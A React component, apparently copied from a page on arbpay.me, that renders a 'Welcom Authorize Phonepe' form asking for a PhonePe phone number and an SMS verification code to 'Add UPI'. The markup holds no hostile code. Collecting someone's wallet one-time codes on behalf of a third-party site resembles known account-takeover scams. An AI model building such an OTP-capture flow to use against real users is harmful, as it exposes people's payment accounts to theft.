import React from "react";

const AuthorizeKyc = () => {
    return (
        <div id="app" data-v-app="">
            <div>
                <div data-v-1dea78b6="" className="container pt48">
                    <div data-v-cdb55647="" data-v-1dea78b6=""
                        className="van-nav-bar van-nav-bar--fixed van-hairline--bottom navbar">
                        <div className="van-nav-bar__content">
                            <div className="van-nav-bar__left van-haptics-feedback"><svg data-v-cdb55647="" width="11"
                                height="18" viewBox="0 0 11 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path data-v-cdb55647="" fill-rule="evenodd" clip-rule="evenodd"
                                    d="M0 9.00011L8.56066 0.439453L10.682 2.56077L4.24264 9.00011L10.682 15.4395L8.56066 17.5608L0 9.00011Z"
                                    fill="#9399A6"></path>
                            </svg></div>
                            <div className="van-nav-bar__title van-ellipsis"><span data-v-cdb55647="">Add Payment Method</span>
                            </div>
                            <div className="van-nav-bar__right van-haptics-feedback">
                                <div data-v-7472f68c="" data-v-cdb55647="" className="x-row x-row-between x-row-middle">
                                    <div data-v-7472f68c="" className="right x-row x-row-middle-center"><img data-v-7472f68c=""
                                        className="refresh" src="https://arbpay.me/assets/refresh-4be8557e.svg"/><i
                                            data-v-7472f68c="" className="line"></i><img data-v-7472f68c="" className="close"
                                                src="https://arbpay.me/assets/close-51d692b1.svg"/></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div data-v-5feb3225="" className="x-register">
                            <div data-v-5feb3225="" className="x-register-content">
                                <div data-v-be74200b="" data-v-5feb3225="" className="x-kycLink">
                                    <div data-v-b62f0b3c="" data-v-be74200b="" className="custom_step appealStyle"
                                        releaseorderflag="false">
                                        <div data-v-b62f0b3c="" className="item"><img data-v-b62f0b3c=""
                                            src="data:image/png;base64,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"
                                            className="stepicon" alt=""/>
                                            <div data-v-b62f0b3c="" className="text">Phone</div>
                                        </div>
                                        <div data-v-b62f0b3c="" className="item activeStyle"><img data-v-b62f0b3c=""
                                            src="data:image/png;base64,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"
                                            className="stepicon" alt=""/>
                                            <div data-v-b62f0b3c="" className="text">Send</div>
                                        </div>
                                        <div data-v-b62f0b3c="" className="item activeStyle">
                                            <div data-v-b62f0b3c="" className="number">3</div>
                                            <div data-v-b62f0b3c="" className="text activeColor">Finish</div>
                                        </div>
                                    </div>
                                    <h3 data-v-be74200b="" className="tit mb4">Welcom Authorize Phonepe</h3>
                                    <p data-v-be74200b="" className="txt mb24">Let us enjoy the work<br data-v-be74200b=""/> 1.Enter
                                        your Phonepe number ;<br data-v-be74200b=""/> 2.Click the“Next”button to proceed.</p>
                                        <div data-v-be74200b="" className="item mb16">
                                            <h1 data-v-be74200b="">Phone Number</h1><input data-v-be74200b="" type="text"
                                                placeholder="Please enter your phone number." maxlength="10"
                                                oninput="value=value.replace(/[^\d]/g,'')"/>
                                        </div>
                                        <div data-v-be74200b="" className="item">
                                            <div data-v-9e71ad3c="" data-v-be74200b="" className="x-send mt16"><label data-v-9e71ad3c=""
                                                className="x-send-lab">Verification Code</label>
                                                <div data-v-9e71ad3c="" className="x-send-box"><input data-v-9e71ad3c=""
                                                    className="x-input input" type="text" placeholder="Enter Verification Code"
                                                    maxlength="6" oninput="value=value.replace(/\D/g,'')"/>
                                                    <div data-v-9e71ad3c="" className="btn action">Send</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div data-v-be74200b="" className="cmdBth active mt32">Add UPI</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                );
};

                export default AuthorizeKyc;
